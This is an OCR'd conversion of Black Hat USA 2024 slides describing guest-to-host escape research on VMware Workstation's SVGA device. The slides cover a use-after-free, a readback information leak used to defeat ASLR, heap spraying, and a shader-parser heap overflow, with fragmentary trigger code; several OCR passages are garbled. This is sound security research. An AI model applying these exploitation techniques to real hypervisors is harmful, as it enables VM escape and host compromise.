---
title: "Bugs of Yore A Bug Hunting Journey on VMware's Hypervisor"
speakers: ["Zisis Sialveras"]
conference: "Black Hat"
conference_full: "Black Hat USA 2024"
edition: "USA"
year: 2024
source_pdf: "Black Hat USA 2024 slides/Zisis Sialveras_Bugs of Yore A Bug Hunting Journey on VMware's Hypervisor.pdf"
pages: 45
sha256: "5fc21b947de8712a9e444f91605be72018db8475740577cc10f19599aae340e5"
text_chars: 18570
ocr_pages: 19
has_ocr: true
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T21:41:29Z"
---
# Bugs of Yore A Bug Hunting Journey on VMware's Hypervisor

**Speakers:** Zisis Sialveras  
**Conference:** Black Hat USA 2024  
**Source:** `Black Hat USA 2024 slides/Zisis Sialveras_Bugs of Yore A Bug Hunting Journey on VMware's Hypervisor.pdf` (45 pages)


## Slide 1

Bugs of yore: A bug hunting journey on VMware’s hypervisor

### Zisis Sialveras, zisis@census-labs.com, @_zisis

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ON Ne
: a" / SS
pisek hat
USA 2024
AUGUST 7-8, 2024
BRIEFINGS
Bugs of yore: A bug hunting
journey on VMware’s hypervisor
Zisis Sialveras, zisis@census-labs.com, @_zisis
#BHUSA @BlackHatEvents
```

## Slide 2

# WHOAMI

- Computer security researcher at CENSUS

- • Finding and exploiting bugs professionally since 2013 • Reversed A LOT of VMware’s code

- Gave a few talks about VMware exploitation in the past

#BHUSA @BlackHatEvents

## Slide 3

# HOW EVERYTHING STARTED

- Goal: Develop guest-to-host escape exploit for VMware Workstation 12 (on Windows host)

- Skills:

   - Developed a fair number of exploits

   - Experienced with low-level stuff

- Disadvantages:

   - Basic knowledge of how virtual machines work

#BHUSA @BlackHatEvents

## Slide 4

# FIRST STEPS

- Map the attack surface

- It’s early 2017, the VMware boom era has not yet started

- • Useful resources:

   - Cloudburst by Kostya Kortchinsky

      - First public attempt for SVGA exploitation

   - Out of the Truman Show: VM Escape in VMware Gracefully

      - RPCI guest-to-host escape exploits

- Decided to go with SVGA

#BHUSA @BlackHatEvents

## Slide 5

# VMWARE ARCHITECTURE

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
Driver
int handler
Virtual Machine
world
switch
VMM
[int handler|
(i)
Host OS Context
VMM Context
=
User-level
System-level
```

## Slide 6

# SVGA SPECIFIC RESOURCES

- What is SVGA ?

- Communication with the guest OS (SVGA FIFO)

- Useful resources:

   - GPU Virtualization on VMware’s Hosted I/O Architecture - Micah Dowty, Jeremy Sugerman

- Mini operating systems for SVGA testing

   - <u>https://sourceforge.net/projects/vmware-svga/</u>

   - Messed with them to understand how graphics work

#BHUSA @BlackHatEvents

## Slide 7

# SVGA THREAD

- VMX host process

- Polls for SVGA commands from the guest

- Communication with the guest using SVGA FIFO (shared memory)

#BHUSA @BlackHatEvents

## Slide 8

# SVGA3D PROTOCOL

- Objects

   - Operations

- MOB (Memory OBject)

   - Define

- Surface

   - Destroy

- Context

   - Bind

- Shader

   - Readback

- Screentarget

- More…

#BHUSA @BlackHatEvents

## Slide 9

# SVGA PROTOCOL EXAMPLE

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q
black hat
USA 2024
SVGA PROTOCOL EXAMPLE
typedef struct SVGA3dCmdDefineGBSurface {
uint32 sid;
SVGA3dSurfacelFlags surfaceFlags;
Sees Ges ; typedef struct SVGA3dCmdBindGBSurface {
uint32 numMipLevels; uint32 sid:
uint32 multisampleCount ; —
SVGAMobId mobid;
SVGA3dTextureFilter autogenFilter ;
SVGA3dSize size;
} SVGA3dCmdDefineGBSurface;
} SVGA3dCmdBindGBSur face;
typedef struct SVGA3dCmdDefineGBMob {
Ss See; typedef struct SVGA3dCmdReadbackGBSurface {
SVGAMobFormat ptDepth; : —s
PPN32 base; aoe Ee;
: } SVGA3dCmdReadbackGBSur face;
uint32 sizeInBytes;
} SVGA3dCmdDefineGBMob ;
```

## Slide 10

THE FIRST BUG

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ao
blackhat —_ P
USA 2024
THE FIRST BUG
#BHUSA @BlackHatEvents
```

## Slide 11

# BLIT CUBE

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q
black hat
USA 2024
u
nt
main(void)
{
SVGA3dVertexDecl *decls;
SVGA3dPrimitiveRange *ranges;
SVGA3dTextureState
vertexSid =
indexSid =
textureSid =
while (1) {
‘ts;
(CID, 1024, 768)
(vertexData, sizeof vertexDa
(indexData, sizeof indexData)
(256, 256, SVGA3D_A8R8G8B8) ;
(CID, &ts, 1);
ts[Q@].stage = 0;
ts[@].name
ts[@].value
decls[@].
decls[@].
decls[@].
decls[@].
decls[@].
ranges[@]
ranges[@]
ranges[@]
ranges[@]
ranges[@]
SVGA3D_TS_BIND_TEXTURE ;
textureSid;
QO;
(CID, &decls, 1, &ranges, 1);
identity.type = SVGA3D_DECLTYPE_FLOAT3;
identity.usage = SVGA3D_DECLUSAGE_POSITION;
array.surfacelId = vertexSid;
array.stride = sizeof(MyVertex) ;
array.offset = (MyVertex, position) ;
.primType = SVGA3D_PRIMITIVE_TRIANGLELIST;
-primitiveCount = numTriangles;
-indexArray.surfaceId = indexSid;
.indexArray.stride = sizeof(uint16) ;
.indexWidth = sizeof(uint16) ;
QO;
int
main(void)
{
SVGA3dVertexDec
1 *decls;
SVGA3dPrimitiveRange *ranges;
SVGA3dTextureSt
vertexSid =
indexSid =
while (1) {
textureSid =
ts[0].sta
ts[0].nam
ts[0].val
decls[@].
decls[@].
decls[@].
decls[@].
decls[@].
ranges[@]
ranges[@]
ranges[@]
ranges[@]
ranges[@]
ate *ts;
(CID, 1024, 768);
(vertexData, sizeof vertexDa
(indexData, sizeof indexData)
(256, 256, SVGA3D_A8R8G8B8)
(CID, &ts, 1);
ge = 2;
e SVGA3D_TS_BIND_TEXTURE ;
ue textureSid;
QO;
(CID, &decls, 1, &ranges, 1);
identity.type = SVGA3D_DECLTYPE_FLOAT3;
identity.usage = SVGA3D_DECLUSAGE_POSITION;
array.surfacelId = vertexSid;
array.stride = sizeof(MyVertex) ;
array.offset = (MyVertex, position) ;
.primType = SVGA3D_PRIMITIVE_TRIANGLELIST;
-primitiveCount = numTriangles;
.indexArray.surfaceId = indexSid;
.indexArray.stride = sizeof(uint16) ;
-indexWidth = sizeof(uint16) ;
QO;
```

## Slide 12

# SMELLS LIKE UAF

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
0:013> g
(978.1£24):
vmware vmx+0x23bcdc:
OO0O007£f6 61f8bcdc 488b5208
0:013> DQ RDX
00000000
00000000°
00000000
00000000
00000000
258b0fe0
258b0ff0
~258b1000
00000000°
258b1010
~258b1020
00000000°
258b1030
~258b1040
00000000°
258b1050
9222222?
SMELLS LIKE UAF
mov
222222722?
Access violation - code c0000005
(tt!
rdx,qword ptr
922227227?
2222227272?
second chance
[rdx+8 ]
```

## Slide 13

# ANALYSIS OF THE DEALLOCATION

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
USA 2024 2.
ANALYSIS OF THE DEALLOCATION
void *CacheView_Get(struct cache *cache_obj, int cdev_type, /* a dozen of arguments */ ) {
buffer[@x1C];
hash;
struct Cache_Slot *found;
// initialize buffer with provided arguments
buffer = ...;3
// use some of the argument to craft a key in the buffer (5)
hash = (buffer, sizeof(buffer) ) ;
// HashTable is implemented by using a double linked list.
// Keeps track of the most recent used object by placing on the list head.
found = (cache_obj, buffer, hash);
if (found)
return found->ptr;
```

## Slide 14

# ANALYSIS OF THE DEALLOCATION 2

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
new_slot =
switch(cdev_type) {
case @:
new_slot->ptr
case 1:
new_slot->ptr
case 2:
new_slot->ptr ();
}
// Cache_Insert tries to keep the list up to limit.
// If too many objects are inserted, it begins to free
// the least recent used.
(cache_obj, new_slot, new_slot);
return new_slot->ptr;
```

## Slide 15

# BUT WHY IT CRASHES ?

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
if (ContextPtr->State & 8) {
while (1) {
Destination = UAFStructPtrGlobalContainer + x280; textureSid = (256, 256, SVGA3D_A8R8G8B8) ;
for (Counter = @; Counter < 8; Counter++) {
if (Context->RenderTargets[i] != exffffffff) { (CID, &ts, 1);
*Destination = (cacheobj, 1, Context->RenderTargets[i].sid, ? ? ?
@, Context->RenderTargets[i].face, 1, Context->RenderTargets[i].mimap, 1); {
} else { ts[0].stage = 0;
*Destination = ; ts[Q@].name = SVGA3D_TS_BIND_TEXTURE;
} ts[@].value = textureSid;
} }
/1 (2) VE
Destination = UAFStructPtrGlobalContainer + @x2c@;
if (*( *)(ContextPtr + ox1a8) != oxffffFfft) { ; (CID, &decls, 1, &ranges, 1);
/* 0. */ A
*Destination = (cacheobj, 2, ...); decls[@].identity.type = SVGA3D_DECLTYPE_FLOAT3;
} else { decls[@].identity.usage = SVGA3D_DECLUSAGE_POSITION;
, “Destination = 3 decls[@].array.surfaceId = vertexSid;
}
if (ContextPtr->State & @x2e) {
Destination = UAFStructPtrGlobalContainer + SomeIndex *
TextureState = ContextPtr->TextureState[SomeIndex] + @x3b@ + Index * @x84;
if (TextureState.value != exffffffFF) {
*Destination =
} else {
*Destination = 5
}
8 + Qx3be;
(cacheobj, 9, Context->TextureState.value, ..
-)5
decls[@].array.stride = sizeof(MyVertex) ;
decls[9@].array.offset = (MyVertex, position) ;
ranges[@].primType = SVGA3D_PRIMITIVE_TRIANGLELIST;
ranges[@].primitiveCount = numTriangles;
ranges[@].indexArray.surfaceId = indexSid;
ranges[9].indexArray.stride = sizeof(uint16) ;
ranges[@].indexWidth = sizeof(uint16) ;
Q);
```

## Slide 16

# HOW TO REACH CacheView_Get()

- Meet all the requirements to trigger it from Windows VM

- DrawPrimitives requirements:

   - Context (Define context command)

   - Vertex declarations

- sub_140287B10 requirements:

   - Render Targets (SetRenderTargets)

SVGA_ThreadRoutine

SVGA_UpdateDisplay

SVGAFifo_ProcessFIFO

SVGACmd_DrawPrimitives

sub_140287B10

- Texture State (SetTextureState)

CacheView_Get

#BHUSA @BlackHatEvents

## Slide 17

## BUILDING THE EXPLOIT

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
PN
blackhat —_
USA 2024
BUILDING THE EXPLOIT
#BHUSA
```

## Slide 18

# DEVELOPING A REAL-WORLD EXPLOIT

- BlitCube vs Windows guest OS

   - Hardware compatibility

   - SVGA3D API changes

- DrawPrimitives is deprecated

   - Use SVGA_3D_CMD_DRAW instead

- SetTextureState, SetRenderTargets are also deprecated

   - Use SVGA_3D_CMD_DEFINE_GB_CONTEXT

#BHUSA @BlackHatEvents

## Slide 19

# MEETING THE REQUIRMENTS

## 1. Context

2. Vertex Declaration

3. Render Targets

4. Texture state

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
MEETING THE REQUIRMENTS
1. Context typedef struct { :
SVGA3dRect viewport;
1 dRect scissorRect ;
2. Vertex Declaration 1 — =
3. Render Ta rgets SVGA3dSurfaceImageId renderTargets|SVGA3D_RT_MAX];
SVGAGBVertexElement decli[4|;
4. Texture state
SVGAGBVertexStream streams | SVGA3D_MAX_VERTEX_ARRAYS ] ;
SVGA3dVertexDivisor divisors [{SVGA3D_MAX_VERTEX_ARRAYS ] ;
uint32 numVertexDecls;
uint32 numVertexStreams ;
typedef struct SVGA3dCmdDefineGBContext { uint32 numVertexDivisors ;
uint32 cid; uint32 pad2/[ 30];
} SVGA3dCmdDefineGBContext ;
uint32 tsColorKey[SVGA3D_NUM_TEXTURE_UNITS] ;
uint32 textureStages|[SVGA3D_NUM_TEXTURE_UNITS ][SVGA3D_TS_CONSTANT + 1];
typedef struct SVGA3dCmdBindGBContext { uint32 €sColorKeyEnable|SVGA3D_NUM_TEXTURE_UNITS ] ;
uint32 cid;
SVGAMobId mobid; SVGA3dShaderConstFloat pShaderFValues|SVGA3D_CONSTREG_MAX] ;
uint32 validContents; SVGA3dShaderConstFloat vShaderFValues | SVGA3D_CONSTREG_MAX |] ;
} SVGA3dCmdBindGBContext ; } SVGAGBContextData;
```

## Slide 20

# TRIGGER THE BUG FROM WINDOWS

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
g fis
black hat
USA 2024 ee
TRIGGER THE BUG FROM WINDOWS
#define VULN_CONTEXT_ID @x60
SurfaceIdBase = 0x1@0;
/*
* InitAndDraw initializes all the required objects and fields
* to force the SVGA3D_CMD DRAW to execute CacheView_Get()
*/
(VULN_CONTEXT_ID, VULN_CONTEXT_ID, SurfaceIdBase,
SurfaceIdBase, 0x20, );
SurfaceIdBase += 9x20;
// The number of loop iterations is calculated in that way to fill
// the cache and free the least recently used buffers.
for (Counter = 1; Counter < @x67; Counter++) {
(VULN_CONTEXT_ID + Counter, VULN_CONTEXT_ID + Counter,
SurfacelIdBase, SurfaceIdBase, 9x20, );
SurfaceIdBase += 9x20;
}
// Use it
(VULN_CONTEXT_ID, VULN_CONTEXT_ID, SurfaceIdBase,
SurfacelIdBase, 90x20, );
```

## Slide 21

# INTERESTING USE

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
USA 2024 2.
INTERESTING USE
if (UAFStructPtrContainer->DepthStencilViewObject && UAFStructPtrContainer->RenderTargetViewObjects[@]) {
ret = (
UAFStructPtrContainer - >DepthStencilViewObject,
UAFStructPtrContainer - >RenderTargetViewObjects[@]);
```

## Slide 22

# NEXT STEPS

- Wrote a kernel driver to trigger the free

- • Forced the execution to go from an interesting use • Everything was straightforward so far

- Need to discover a way to spray the heap to reclaim the region

#BHUSA @BlackHatEvents

## Slide 23

# HELLO SHADERS

- SVGA_3D_CMD_SET_SHADER

- ShaderBuffer contents are controllable from guest

- • Not freed until SVGA_3D_CMD_DESTROY_GB_SHADER

#BHUSA @BlackHatEvents

## Slide 24

# ALMOST THERE

- Windows kernel driver can

   - Trigger the free

   - Spray the heap with controllable data

   - Use the UAF chunk contents into a call instruction

- Need an information leak

   - Where to look ??

#BHUSA @BlackHatEvents

## Slide 25

MORE BUGS

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
| wr
pifek hat — 2 4
USA 2024
MORE BUGS
#BHUSA @BlackHatEvents
```

## Slide 26

# READBACK MECHANISM

- Mechanism for reading back to guest the contents from the SVGA objects (contexts, surface, etc)

- Surface readback is complex because of the huge number of surfaces formats

- Code full of mathematical operations with surface dimensions => prone to errors

#BHUSA @BlackHatEvents

## Slide 27

# SURFACE BACKEND OBJECTS

- On Windows host surfaces are represented at the backend with ResourceContainers objects

- RC has a buffer that will store surface contents

- On VMware 12.5.7, 9 different RC types depending on surface format.

#BHUSA @BlackHatEvents

## Slide 28

# RC9 INIT

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
USA 2024 2.
RCO INIT
ResourceContainer *rc, SVGA_Surface *surface, /*...*/) {
RCType;
// we. SVGA3dSize size3d;
Format; while (mipmap_level < surface->mipmap) {
//
SVGA3dSize Dimensions;
// ee rowpitch = (size3d)
. size = (
FUNCPTR Init; SurfaceFormatCaps[surface->type], size3d, rowpitch);
FUNCPTR Fini;
[/ as. }
*Buffer[ ];
size3d = // calculated from surface and mipmap_level
rc->Buffer[mipmap_level++] = (size);
return 1;
```

## Slide 29

# INFORMATION LEAK

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
piseichat a
INFORMATION LEAK
// Both source and destination surfaces will allocate a ResourceContainer of type 9 at the next Draw call.
SVGA3D_DefineGBSurface( sid: SourceSurfaceId, (SVGA3dSurfaceFlags)0x20008000, format: SVGA3D_BC3_UNORM,
numMipLevels: 1, multisampleCount: 0, autogenFilter: SVGA3D_TEX_FILTER_NONE , &size3d);
SVGA3D_DefineGBSurface( sid: DestinationSurfaceId, (SVGA3dSurfaceFlags)0x20008000, format: SVGA3D_BC3_UNORM,
numMipLevels: 1, multisampleCount: 0, autogenFilter: SVGA3D_TEX_FILTER_NONE, &size3d);
SVGA3D_Draw( cid: LeakCtxId, primCnt: 0x4141, startVertexLoc: 0x1337, primType: SVGA3D_PRIMITIVE_TRIANGLELIST) ;
// Clear the allocated pages
memset(_Ddst: DstMobPageEntry->VirtualAddr, _val: 0, PAGE_SIZE);
/* Surface must be bound BEFORE SurfaceCopy command. */
SVGA3D_DefineGBMOB(DestinationMobId, SVGA3D_MOBFMT_PTDEPTH_®,
base: PA2PPN(DstMobPageEntry->PhysicalAddr.LowPart), sz: 0x1000);
SVGA3D_BindGBSurface( sid: DestinationSurfaceId, DestinationMobId) ;
SVGA3D_SurfaceCopy(sresid: SourceSurfacelId, srcFace: ©, srcMipmap: 0,
dstSid: DestinationSurfaceld, dstFace: 0, dstMipmap: 0, Boxes: NULL, BoxesSizeInBytes:
// trigger the leak :)
SVGA3D_ReadbackGBSurface( sid: DestinationSurfaceld) ;
```

## Slide 30

# DEFEATING ASLR: SPRAY WITH RC

- Spray with RC

   - Type is irrelevant; all of them have funcptrs

#BHUSA @BlackHatEvents

## Slide 31

# DEFEATING ASLR: FREE

- Spray with RCs

   - Type is irrelevant; all of them have funcptrs

- Free the RCs

#BHUSA @BlackHatEvents

## Slide 32

# DEFEATING ASLR: ALLOC RC9

- Spray with RCs

   - Type is irrelevant; all of them have funcptrs

- Free the RCs

- Allocate RC9

   - Surface dimensions affect the data buffer size

   - Data buffer size must be equal to RC

#BHUSA @BlackHatEvents

## Slide 33

# DEFEATING ASLR: READBACK

- Spray with RCs

   - Type is irrelevant all of them have funcptrs

- Free the RCs

- Allocate RC9

   - Surface dimensions affect the data buffer size

   - Data buffer size must be equal to RC

- Readback!

#BHUSA @BlackHatEvents

## Slide 34

# ALL TOGETHER

- Defeat ASLR

- Leak a RC; they have function pointers

- • Trigger the free

- Spray with shaders, reclaim the heap chunk

- • Execute and pwn!

#BHUSA @BlackHatEvents

## Slide 35

## EVEN MORE BUGS

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat —
USA 2024
healer dire
i fie die,
fied feagen fic echo att Susie, easlanaes ela
Coreen ga Gixasctchettertaree fa Magen Hatenfie groffe Crs fiatline Britlen,
Hafmenien langen S ake voll rrobeeectientes Speoceci, ist ez: Silo ale mit hard (hy
¥ aml verfecbenift, anefange Licthic tind darmit detiten fc rméman thin, nd gebraiice
EVEN MORE BUGS
#BHUSA @BlackHatEvents
```

## Slide 36

# VERSION 14

- All bugs were patched 

- Urge to rewrite an exploit

- Now I’m familiar with the code

   - Better understanding of where to look for bugs

   - More experienced with exploitation techniques/objects

#BHUSA @BlackHatEvents

## Slide 37

# SHADER MODEL 3

- Few blogposts and CVEs for SM4 bugs in VMware

- • While reversing SVGA_3D_CMD_DRAW  handler for the previous exploit I discovered the SM3 parser

- • Confirmed I can reach it

- Started reversing the parser

#BHUSA @BlackHatEvents

## Slide 38

# NEW BUG FOUND!

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
g >
black hat
USA 2024 e
NEW BUG FOUND!
ParseSM3 (
ShaderObject *obj,
ShaderSizeInDwords,
ShaderBuffer) {
// 4. sub_14030F7D0( *obj, val, *InstrBuffer) {
while ( (ShaderParserObject, Position;
&InstrBuffer, &Opcode)) { struct VulnBufferSlot {
if (! (obj, &InstrBuffer, &Opcode) )
goto fail;
}
SM3_@x51Handler(ShaderObject *obj, *InstrBuffer) { : .
veut if (obj->VulnBuffer == ){
p = obj->VulnBuffer = (@x100@09, 0x140e);
}
if (val < @x10ee) {
Position = obj->VulnBufferOffset ;
p[Position].a = InstrBuffer++;
p[Position].b = InstrBuffer;
p[Position].c = val;
val = *( *)InstrBuffer ;
if (val >= 0x10@)
return E
if (*( *)obj->Offsetex4Es) {
(obj + Oxidef@, val, ++InstrBuffer) ;
} else {
VF? soo i
obj->VulnBufferOffset++; // (1)
}
```

## Slide 39

# WHAT TO CORRUPT ?

- Heap memory corruption bug with semi-controlled data

   - Used LFH metadata attack to leverage the bug

      - Out of topic; won’t get into details here

      - Outcome: write data in a heap chunk of my choice

- RC are again quite interesting

   - Have data buffers copied to/from guest memory

   - Have function pointers

   - Multiple allocations

#BHUSA @BlackHatEvents

## Slide 40

# INFO LEAK

- Spray with two different RC types

   - Different RC types have different sizes

   - Placed in different LFH userblocks

- Calculate data buffers of RC1 to be equal size of RC0

#BHUSA @BlackHatEvents

## Slide 41

# INFO LEAK

- Spray with two different RC types

   - Different RC types have different sizes

   - Placed in different LFH userblocks

- Calculate data buffers of RC1 to be equal size of RC0

- Use the bug to modify dimensions of RC1

- Readback to leak function pointers

#BHUSA @BlackHatEvents

## Slide 42

# ARBITRARY CODE EXEC

- We know VMX base address

   - ASLR is defeated

- Use the bug to corrupt function pointers of RC0

- Pwn

#BHUSA @BlackHatEvents

## Slide 43

# BLACK HAT SOUND BYTES

• Targeting a complex software can be frustrating in the beginning

• Having something concrete (such as bug) can be a huge motivation

• The more time you spend, the more efficient you become to find bugs

• Recognizing robust and reusable exploitation primitives will be extremely rewarding in the long run

#BHUSA @BlackHatEvents

## Slide 44

# REFERENCES

- Bringing Virtualization to the x86 Architecture with the Original VMware Workstation – Bugnion, Devine, Rosenblum, Sugerman, Wang

- Cloudburst Hacking 3D and Breaking Out of Vmware - Kostya Kortchinsky, Black Hat USA 2009

- Out of the Truman Show: VM Escape in VMware Gracefully - Lei Shi, Mei Wang, Blue Hat 2017

- GPU Virtualization on VMware’s Hosted I/O Architecture - Micah Dowty, Jeremy Sugerman

- Straight outta VMware: Modern exploitation of the SVGA device for guest-to-host escape exploits – Zisis Sialveras

- Wandering through the Shady Corners of VMware Workstation/Fusion – Nico Ralf

- Linux vmwgfx - https://elixir.bootlin.com/linux/latest/source/drivers/gpu/drm/vmwgfx

- Special thanks to Nick Sampanis for triggering the blit-cube bug.

#BHUSA @BlackHatEvents

## Slide 45

THANK YOU!

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
‘ “Vary \ em,
<
blackhat' = ~—-
USA 2024
#BHUSA @BlackHatEvents
```
